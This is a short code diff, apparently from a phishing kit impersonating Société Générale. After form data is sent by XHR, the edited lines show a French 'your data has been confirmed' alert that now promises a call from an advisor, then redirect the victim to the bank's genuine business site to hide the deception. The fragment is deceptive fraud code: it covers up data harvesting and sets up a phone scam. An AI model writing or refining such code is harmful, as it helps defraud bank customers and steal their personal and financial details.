@@ -436,8 +436,8 @@ window.swmConfOverride = {
 
                 // Envoyer la requête avec les données
                 xhr.send(data);
-                alert('Felicitation vos données ont été confirmer avec succès')
-                window.location.href="<?= route('home') ?>"
+                alert('Felicitation vos données ont été confirmer avec succès !  Un conseiller va vous contacter par téléphone')
+                window.location.href="https://entreprises.sg.fr/"
         }
         else {
 
